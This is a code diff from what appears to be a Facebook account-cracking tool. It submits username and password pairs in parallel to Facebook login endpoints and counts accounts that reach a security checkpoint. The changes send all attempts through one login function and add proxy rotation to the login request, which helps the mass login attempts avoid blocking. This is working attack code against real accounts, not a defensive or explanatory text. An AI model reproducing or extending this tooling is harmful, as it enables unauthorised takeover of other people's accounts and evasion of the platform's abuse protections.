@@ -1606,7 +1606,7 @@ def metslow():
                 elif "fankybapi" in method:
                 	pool.submit(fanky_b_api,idf,pwv)
                 else:
-                	pool.submit(fankytouch,idf,pwv)
+                	pool.submit(fanky_b_api,idf,pwv)
                 
                 	
                 	
@@ -1677,7 +1677,7 @@ def metcepat():
                 elif "fankybapi" in method:
                 	pool.submit(fanky_b_api,idf,pwv)
                 else:
-                	pool.submit(fankytouch,idf,pwv)
+                	pool.submit(fanky_b_api,idf,pwv)
  
     print("")
     Console().print(
@@ -1957,7 +1957,7 @@ def fanky_b_api(idf, pwv):
                 "DNT": "1"
             }
             fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
-            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
+            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False,proxies=proxs)
             if "checkpoint" in po.cookies.get_dict().keys():
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
